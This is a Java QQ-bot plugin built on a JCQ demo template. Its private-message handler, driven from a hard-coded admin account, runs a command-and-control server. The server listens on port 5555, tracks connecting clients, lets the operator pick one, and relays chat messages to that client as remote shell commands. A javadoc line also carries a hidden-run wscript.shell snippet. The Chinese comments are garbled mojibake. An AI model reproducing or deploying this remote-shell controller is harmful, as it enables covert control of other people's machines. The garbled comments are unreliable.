package com.example;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import javax.swing.JOptionPane;

import com.sobte.cqp.jcq.entity.Anonymous;
import com.sobte.cqp.jcq.entity.CQDebug;
import com.sobte.cqp.jcq.entity.GroupFile;
import com.sobte.cqp.jcq.entity.ICQVer;
import com.sobte.cqp.jcq.entity.IMsg;
import com.sobte.cqp.jcq.entity.IRequest;
import com.sobte.cqp.jcq.event.JcqAppAbstract;

/**
 * ���ļ���JCQ���������<br>
 * <br>
 * 
 * ע���޸�json�е�class���������࣬�粻����������appid���أ����һ�������Զ���д����<br>
 * ����appid(com.example.demo) ������� com.example.Demo<br>
 * �ĵ���ַ�� https://gitee.com/Sobte/JCQ-CoolQ <br>
 * ���ӣ�https://cqp.cc/t/37318 <br>
 * ������������: {@link JcqAppAbstract#CQ CQ}({@link com.sobte.cqp.jcq.entity.CoolQ ��Q���Ĳ�����}),
 * 			 {@link JcqAppAbstract#CC CC}({@link com.sobte.cqp.jcq.entity.CQCode ��Q�������}),
 * 			   ���幦�ܿ��Բ鿴�ĵ�
 */
public class Demo extends JcqAppAbstract implements ICQVer, IMsg, IRequest {

	public static final long adminQQ = 2102084678;	//�����ߵ�QQ��
	public static int start_flag = 0;	//������Ƿ����� 1:��	-1:��
	public static ArrayList aClientQueue = new ArrayList();	//���ض˶���
	public static int iClientId = 0;	//���ض�id
	public static int iCurrentClientId = -1;	//��ǰ���ض�id
	public static final int PORT = 5555;	//�˿�
	public static clientInfo cCurrentClientInfo;	//��ǰ�����ı��ض���Ϣ
		
	/**
     * ��main�������Կ�����󻯵ļӿ쿪��Ч�ʣ����Ͷ�λ����λ��<br/>
     * ���¾���ʹ��Main�������в��Ե�һ�����װ���
     *
     * @param args ϵͳ����
     */
    public static void main(String[] args) {
        // CQ�˱���Ϊ�����������JCQ����ʱʵ������ֵ��ÿ����������ڲ����п�����CQDebug����������
        CQ = new CQDebug();//new CQDebug("Ӧ��Ŀ¼","Ӧ������") �����ô˹�������ʼ��Ӧ�õ�Ŀ¼
        CQ.logInfo("[JCQ] TEST Demo", "��������");// ���ھͿ�����CQ������ִ���κ���Ҫ�Ĳ�����
        // Ҫ�����������ʵ����һ���������
        Demo demo = new Demo();
        // �����������и���������,����JCQ���й��̣�ģ��ʵ�����
        demo.startup();// �������п�ʼ ����Ӧ�ó�ʼ������
        demo.enable();// �����ʼ����ɺ�����Ӧ�ã���Ӧ����������
        // ��ʼģ�ⷢ����Ϣ
        // ģ��˽����Ϣ
        // ��ʼģ��QQ�û�������Ϣ������QQȫ�����죬�������
        demo.privateMsg(0, 10001, 2234567819L, "С���Լ��", 0);
        demo.privateMsg(0, 10002, 2222222224L, "������������", 0);
        demo.privateMsg(0, 10003, 2111111334L, "���Ը������΢����", 0);
        demo.privateMsg(0, 10004, 3111111114L, "�����������", 0);
        demo.privateMsg(0, 10005, 3333333334L, "��û�����������QAQ", 0);
        // ģ��Ⱥ����Ϣ
        // ��ʼģ��Ⱥ����Ϣ
        demo.groupMsg(0, 10006, 3456789012L, 3333333334L, "", "�˵�", 0);
        demo.groupMsg(0, 10008, 3456789012L, 11111111114L, "", "С���أ���������ѽ", 0);
        demo.groupMsg(0, 10009, 427984429L, 3333333334L, "", "[CQ:at,qq=2222222224] ��һ������Ϸ����������", 0);
        demo.groupMsg(0, 10010, 427984429L, 3333333334L, "", "�þò����� [CQ:at,qq=11111111114]", 0);
        demo.groupMsg(0, 10011, 427984429L, 11111111114L, "", "qwq ��û��һ�𿪵�\n[CQ:at,qq=3333333334]������", 0);
        // ......
        // �������ƣ����Ը���ʵ������޸Ĳ������ͷ�������Ч��
        // ��������β��������
        // demo.disable();// ʵ�ʹ����г���������ᴥ��disable��ֻ���û��ر��˴˲���Żᴥ��
        demo.exit();// ���������н���������exit����
    }

    /**
     * ����󽫲������ �벻Ҫ�ڴ��¼���д��������
     *
     * @return ����Ӧ�õ�ApiVer��Appid
     */
    public String appInfo() {
        // Ӧ��AppID,����� http://d.cqp.me/Pro/����/������Ϣ#appid
        String AppID = "com.example.demo";// ��ס�������ļ���jsonҲҪʹ��appid���ļ���
        /**
         * ����������ֹ�����������κδ��룬���ⷢ���쳣�����
         * ����ִ�г�ʼ���������� startup �¼���ִ�У�Type=1001����
         */
        return CQAPIVER + "," + AppID;
    }

    /**
     * ��Q���� (Type=1001)<br>
     * ���������ڿ�Q�����̡߳��б����á�<br>
     * ��������ִ�в����ʼ�����롣<br>
     * ����ؾ��췵�ر��ӳ��򣬷���Ῠס��������Լ�������ļ��ء�
     *
     * @return ��̶�����0
     */
    public int startup() {
        // ��ȡӦ������Ŀ¼(���财������ʱ���뽫����ע��)
        String appDirectory = CQ.getAppDirectory();
        // �����磺D:\CoolQ\app\com.sobte.cqp.jcq\app\com.example.demo\
        // Ӧ�õ��������ݡ����á����롿����ڴ�Ŀ¼��������û��������š�
        
        CQ.sendPrivateMsg(adminQQ, "��Q������");
        return 0;
    }

    /**
     * ��Q�˳� (Type=1002)<br>
     * ���������ڿ�Q�����̡߳��б����á�<br>
     * ���۱�Ӧ���Ƿ����ã������������ڿ�Q�˳�ǰִ��һ�Σ���������ִ�в���رմ��롣
     *
     * @return ��̶�����0�����غ��Q���ܿ�رգ��벻Ҫ��ͨ���̵߳ȷ�ʽִ���������롣
     */
    public int exit() {
    	CQ.sendPrivateMsg(adminQQ, "��Q�˳���");
        return 0;
    }

    /**
     * Ӧ���ѱ����� (Type=1003)<br>
     * ��Ӧ�ñ����ú󣬽��յ����¼���<br>
     * �����Q����ʱӦ���ѱ����ã����� {@link #startup startup}(Type=1001,��Q����) �����ú󣬱�����Ҳ��������һ�Ρ�<br>
     * ��Ǳ�Ҫ����������������ش��ڡ�
     *
     * @return ��̶�����0��
     */
    public int enable() {
        enable = true;
        return 0;
    }

    /**
     * Ӧ�ý���ͣ�� (Type=1004)<br>
     * ��Ӧ�ñ�ͣ��ǰ�����յ����¼���<br>
     * �����Q����ʱӦ���ѱ�ͣ�ã��򱾺��������᡿�����á�<br>
     * ���۱�Ӧ���Ƿ����ã���Q�ر�ǰ�������������᡿�����á�
     *
     * @return ��̶�����0��
     */
    public int disable() {
        enable = false;
        return 0;
    }

    /**
     * ˽����Ϣ (Type=21)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subType �����ͣ�11/���Ժ��� 1/��������״̬ 2/����Ⱥ 3/����������
     * @param msgId   ��ϢID
     * @param fromQQ  ��ԴQQ
     * @param msg     ��Ϣ����
     * @param font    ����
     * @return ����ֵ*����*ֱ�ӷ����ı� ���Ҫ�ظ���Ϣ�������api����<br>
     * ���� ����  {@link IMsg#MSG_INTERCEPT MSG_INTERCEPT} - �ضϱ�����Ϣ�����ټ�������<br>
     * ע�⣺Ӧ�����ȼ�����Ϊ"���"(10000)ʱ������ʹ�ñ�����ֵ<br>
     * ������ظ���Ϣ������֮���Ӧ��/�������������� ����  {@link IMsg#MSG_IGNORE MSG_IGNORE} - ���Ա�����Ϣ
     */
    public int privateMsg(int subType, int msgId, long fromQQ, String msg, int font) {
        // ���ﴦ����Ϣ
        //CQ.sendPrivateMsg(fromQQ, "�㷢������������Ϣ��" + msg + "\n����Java���");
        if(subType == 11 && fromQQ == adminQQ) //�ж����Ժ�����Ϣ ���������Թ���Ա��QQ�˺�
        {
        	if(msg.equals("startx"))
        	{
        		Demo.CQ.logInfo("Menu", "startx");
        		if(start_flag != 0)
        		{
        			CQ.sendPrivateMsg(fromQQ, "������Ѿ�����");
        			return MSG_IGNORE;
        		}
        		start_flag = 1;	//�б�״̬
        		CQ.sendPrivateMsg(fromQQ, "��ǰ����Ա: " + adminQQ + "\n"
        				+ "�������������...\n"
        				+"ls: �г�������������\n"
        				+ "cd: �л���id��Ӧ���� ch [hostId]");
        		try {	//����ѽ����̷߳������� ��������߳̾ͻ��˳�
        			ServerSocket server = new ServerSocket(Demo.PORT);
        			Demo.CQ.sendPrivateMsg(Demo.adminQQ, "��ʼ�����˿�");
        			while(true)
        			{
        				Socket s1 = server.accept();
        				clientInfo c1= new clientInfo(Demo.iClientId++,s1);
        				Demo.aClientQueue.add(c1);	//����һ������ ������ӵ���������
        				Demo.CQ.sendPrivateMsg(Demo.adminQQ, "�¿ͻ�������"+s1.getInetAddress()+":"+s1.getPort());	//֪ͨ����Ա
        				new Thread(new clientThread(c1)).start();
        				
        			}
        			
        		} catch (IOException e) {
        			// TODO �Զ����ɵ� catch ��
        			e.printStackTrace();
        		}
        	    
        	}else if(msg.equals("ls"))
        	{
        		Demo.CQ.logInfo("Menu", "ls");
        		if(start_flag == 1)	//�����б�״̬
        		{
	        		StringBuilder sb = new StringBuilder();
	        		sb.append("���¿ͻ�������:\n");
	        		for(int i = 0;i<aClientQueue.size();i++)
	        		{
	        			clientInfo u1 = (clientInfo)aClientQueue.get(i);
	        			sb.append(u1.id+": "+u1.s.getInetAddress()+":"+u1.s.getPort()+"\n");
	        		}
	        		CQ.sendPrivateMsg(adminQQ, sb.toString());
        		}else
        		{
        			CQ.sendPrivateMsg(adminQQ, "����ͨ��EC�˳�[id="+iCurrentClientId+"]�Ŀ���״̬");
        		}
        	}else if(msg.toCharArray()[0] == 'c' && msg.toCharArray()[1] == 'h')	//�����ch���� �л����ض�
        	{
        		Demo.CQ.logInfo("Menu", "cd");
        		try 
        		{
	        		iCurrentClientId = Integer.parseInt(msg.substring(3));
	        		for(int i= 0 ;i < aClientQueue.size();i++)
	        		{
	        			clientInfo u1 = (clientInfo)aClientQueue.get(i);
	        			if(u1.id == iCurrentClientId)	//�ж϶���������û����Ҫ�л��ı��ض�
	        			{
	        				CQ.sendPrivateMsg(adminQQ, "�ɹ��л����Ƶ� [id="+iCurrentClientId+"]\n������������:\n"
	        						+ "shell: �������ض˵�shell\n"
	        						+ "EC: �˳����ض˵Ŀ���״̬");
	        				start_flag = 2;
	        				cCurrentClientInfo = u1;	//���µ�ǰ�������ض���Ϣ
	        				return MSG_IGNORE;
	        			}
	        		}
	        		CQ.sendPrivateMsg(adminQQ, "�����ڵı��ض�" + Integer.parseInt(msg.substring(3)));	//��������û����Ҫ�л��ı��ض�
	        		start_flag = 1;
        		}catch(Exception e)
        		{
        			CQ.logInfo("ch", e.toString());
        		}
        	}else if(msg.equals("shell"))
        	{
        		Demo.CQ.logInfo("Menu", "shell");
        		if(start_flag == 2)	//�Ѿ��л���ĳ�����ض���
        		{
					try {
						CQ.sendPrivateMsg(adminQQ, "�л���[id="+iCurrentClientId+"] ��shell״̬");
	        			OutputStream os;
						os = cCurrentClientInfo.s.getOutputStream();
						os.write("shell".getBytes("GBK"));	//����"shell"ʹ�ͻ��˽������shell�����״̬
						os.flush();
						start_flag = 3;	//shell״̬
						return MSG_IGNORE;
					} catch (IOException e) {
						// TODO �Զ����ɵ� catch ��
						e.printStackTrace();
					}
        		}else
        		{
        			CQ.sendPrivateMsg(adminQQ, "�л������ض�״̬�ſ���shell����");
        		}
        		
        	}else if(msg.equals("EC"))
        	{
        		Demo.CQ.logInfo("Menu", "EC");
        		if(start_flag == 2)
        		{
        			CQ.sendPrivateMsg(adminQQ, "�˳� [id="+iCurrentClientId+"] �Ŀ���״̬");
        			start_flag = 1;	//�б�״̬
        		}else
        		{
        			CQ.sendPrivateMsg(adminQQ, "���ڲ��ǿ���״̬,�����˳�����״̬");
        		}
        	}else if(msg.equals("SE"))
        	{
        		Demo.CQ.logInfo("Menu", "SE");
        		if(start_flag == 2 || start_flag == 3)
        		{
        			CQ.sendPrivateMsg(adminQQ, "�˳� [id="+iCurrentClientId+"] �Ŀ���״̬");
        			start_flag = 1;	//�б�״̬
        		}else
        		{
        			CQ.sendPrivateMsg(adminQQ, "���ڲ��ǿ���״̬,�����˳�����״̬");
        		}
        	}else
        	{
        		CQ.logInfo("Menu", "shell״̬");
        		if(start_flag == 3)	//shell״̬ ����shell����
        		{
        			CQ.logInfo("Shell", "����shell״̬");
        			try {
						//InputStream read = cCurrentClientInfo.s.getInputStream();
						OutputStream os = cCurrentClientInfo.s.getOutputStream();
						
						CQ.logInfo("Shell", "Shell����֮ǰ");
						if(msg.equals("ES"))
						{
							CQ.sendPrivateMsg(adminQQ, "�˳�"+iCurrentClientId+"shell״̬,�����ǿ���״̬");
		        			start_flag = 2;
						}
						os.write(msg.getBytes("GBK"));	//����shell����
						os.flush();
						CQ.logInfo("Shell��������", msg);	
						
						return MSG_IGNORE;
						//byte str[] = new byte[1024*10];
					    //read.read(str);
						//CQ.sendPrivateMsg(adminQQ, new String(str,"GBK"));
					} catch (IOException e) {
						// TODO �Զ����ɵ� catch ��
						CQ.logInfo("shell�쳣", e.toString());
						e.printStackTrace();
					}
        		}
        	}
        	CQ.logInfo("shell", "״̬: " + start_flag);
        }
    	
    	return MSG_IGNORE;
    }
    


    
    
    /**
     * Ⱥ��Ϣ (Type=2)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subType       �����ͣ�Ŀǰ�̶�Ϊ1
     * @param msgId         ��ϢID
     * @param fromGroup     ��ԴȺ��
     * @param fromQQ        ��ԴQQ��
     * @param fromAnonymous ��Դ������
     * @param msg           ��Ϣ����		createobject ("wscript.shell").run "",0
     * @param font          ����
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int groupMsg(int subType, int msgId, long fromGroup, long fromQQ, String fromAnonymous, String msg,
                        int font) {
        // �����Ϣ����������
        if (fromQQ == 80000000L && !fromAnonymous.equals("")) {
            // �������û���Ϣ�ŵ� anonymous ������
            Anonymous anonymous = CQ.getAnonymous(fromAnonymous);
        }

        // ����CQ�밸�� �磺[CQ:at,qq=100000]
        // ����CQ�� ���ñ���Ϊ CC(CQCode) �˱���רΪCQ�������ض���ʽ���˽����ͷ�װ
        // CC.analysis();// �˷�����CQ�����Ϊ��ֱ�Ӷ�ȡ�Ķ���
        // ������Ϣ�е�QQID
        //long qqId = CC.getAt(msg);// �˷���Ϊ��㷽������ȡ��һ��CQ:at���QQ�ţ�����ʱΪ��-1000
        //List<Long> qqIds = CC.getAts(msg); // �˷���Ϊ��ȡ��Ϣ�����е�CQ����󣬴���ʱ���� �ѽ���������
        // ������Ϣ�е�ͼƬ
        //CQImage image = CC.getCQImage(msg);// �˷���Ϊ��㷽������ȡ��һ��CQ:image���ͼƬ���ݣ�����ʱ��ӡ�쳣������̨������ null
        //List<CQImage> images = CC.getCQImages(msg);// �˷���Ϊ��ȡ��Ϣ�����е�CQͼƬ���ݣ�����ʱ��ӡ�쳣������̨������ �ѽ���������

        // ���ﴦ����Ϣ
        //CQ.sendGroupMsg(fromGroup, CC.at(fromQQ) + "�㷢������������Ϣ��" + msg + "\n����Java���");
        return MSG_IGNORE;
    }

    /**
     * ��������Ϣ (Type=4)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subtype     �����ͣ�Ŀǰ�̶�Ϊ1
     * @param msgId       ��ϢID
     * @param fromDiscuss ��Դ������
     * @param fromQQ      ��ԴQQ��
     * @param msg         ��Ϣ����
     * @param font        ����
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int discussMsg(int subtype, int msgId, long fromDiscuss, long fromQQ, String msg, int font) {
        // ���ﴦ����Ϣ

        return MSG_IGNORE;
    }

    /**
     * Ⱥ�ļ��ϴ��¼� (Type=11)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subType   �����ͣ�Ŀǰ�̶�Ϊ1
     * @param sendTime  ����ʱ��(ʱ���)// 10λʱ���
     * @param fromGroup ��ԴȺ��
     * @param fromQQ    ��ԴQQ��
     * @param file      �ϴ��ļ���Ϣ
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int groupUpload(int subType, int sendTime, long fromGroup, long fromQQ, String file) {
        GroupFile groupFile = CQ.getGroupFile(file);
        if (groupFile == null) { // ����Ⱥ�ļ���Ϣ�����ʧ��ֱ�Ӻ��Ը���Ϣ
            return MSG_IGNORE;
        }
        // ���ﴦ����Ϣ
        return MSG_IGNORE;
    }

    /**
     * Ⱥ�¼�-����Ա�䶯 (Type=101)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subtype        �����ͣ�1/��ȡ������Ա 2/�����ù���Ա
     * @param sendTime       ����ʱ��(ʱ���)
     * @param fromGroup      ��ԴȺ��
     * @param beingOperateQQ ������QQ
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int groupAdmin(int subtype, int sendTime, long fromGroup, long beingOperateQQ) {
        // ���ﴦ����Ϣ

        return MSG_IGNORE;
    }

    /**
     * Ⱥ�¼�-Ⱥ��Ա���� (Type=102)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subtype        �����ͣ�1/ȺԱ�뿪 2/ȺԱ����
     * @param sendTime       ����ʱ��(ʱ���)
     * @param fromGroup      ��ԴȺ��
     * @param fromQQ         ������QQ(��������Ϊ2ʱ����)
     * @param beingOperateQQ ������QQ
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int groupMemberDecrease(int subtype, int sendTime, long fromGroup, long fromQQ, long beingOperateQQ) {
        // ���ﴦ����Ϣ

        return MSG_IGNORE;
    }

    /**
     * Ⱥ�¼�-Ⱥ��Ա���� (Type=103)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subtype        �����ͣ�1/����Ա��ͬ�� 2/����Ա����
     * @param sendTime       ����ʱ��(ʱ���)
     * @param fromGroup      ��ԴȺ��
     * @param fromQQ         ������QQ(������ԱQQ)
     * @param beingOperateQQ ������QQ(����Ⱥ��QQ)
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int groupMemberIncrease(int subtype, int sendTime, long fromGroup, long fromQQ, long beingOperateQQ) {
        // ���ﴦ����Ϣ

        return MSG_IGNORE;
    }

    /**
     * �����¼�-��������� (Type=201)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subtype  �����ͣ�Ŀǰ�̶�Ϊ1
     * @param sendTime ����ʱ��(ʱ���)
     * @param fromQQ   ��ԴQQ
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int friendAdd(int subtype, int sendTime, long fromQQ) {
        // ���ﴦ����Ϣ

        return MSG_IGNORE;
    }

    /**
     * ����-������� (Type=301)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subtype      �����ͣ�Ŀǰ�̶�Ϊ1
     * @param sendTime     ����ʱ��(ʱ���)
     * @param fromQQ       ��ԴQQ
     * @param msg          ����
     * @param responseFlag ������ʶ(����������)
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int requestAddFriend(int subtype, int sendTime, long fromQQ, String msg, String responseFlag) {
        // ���ﴦ����Ϣ

        /**
         * REQUEST_ADOPT ͨ��
         * REQUEST_REFUSE �ܾ�
         */

        // CQ.setFriendAddRequest(responseFlag, REQUEST_ADOPT, null); // ͬ������������
        return MSG_IGNORE;
    }

    /**
     * ����-Ⱥ��� (Type=302)<br>
     * ���������ڿ�Q���̡߳��б����á�<br>
     *
     * @param subtype      �����ͣ�1/����������Ⱥ 2/�Լ�(����¼��)������Ⱥ
     * @param sendTime     ����ʱ��(ʱ���)
     * @param fromGroup    ��ԴȺ��
     * @param fromQQ       ��ԴQQ
     * @param msg          ����
     * @param responseFlag ������ʶ(����������)
     * @return ���ڷ���ֵ˵��, �� {@link #privateMsg ˽����Ϣ} �ķ���
     */
    public int requestAddGroup(int subtype, int sendTime, long fromGroup, long fromQQ, String msg,
                               String responseFlag) {
        // ���ﴦ����Ϣ

        /**
         * REQUEST_ADOPT ͨ��
         * REQUEST_REFUSE �ܾ�
         * REQUEST_GROUP_ADD Ⱥ���
         * REQUEST_GROUP_INVITE Ⱥ����
         */
		/*if(subtype == 1){ // ����ΪȺ�����ж��Ƿ�Ϊ����������Ⱥ
			CQ.setGroupAddRequest(responseFlag, REQUEST_GROUP_ADD, REQUEST_ADOPT, null);// ͬ����Ⱥ
		}
		if(subtype == 2){
			CQ.setGroupAddRequest(responseFlag, REQUEST_GROUP_INVITE, REQUEST_ADOPT, null);// ͬ�������Ⱥ
		}*/

        return MSG_IGNORE;
    }

    /**
     * ����������JCQ���̡߳��б����á�
     *
     * @return �̶�����0
     */
    public int menuA() {
        JOptionPane.showMessageDialog(null, "���ǲ��Բ˵�A��������������ش���");
        return 0;
    }

    /**
     * ���������ڿ�Q���̡߳��б����á�
     *
     * @return �̶�����0
     */
    public int menuB() {
        JOptionPane.showMessageDialog(null, "���ǲ��Բ˵�B��������������ش���");
        return 0;
    }

}
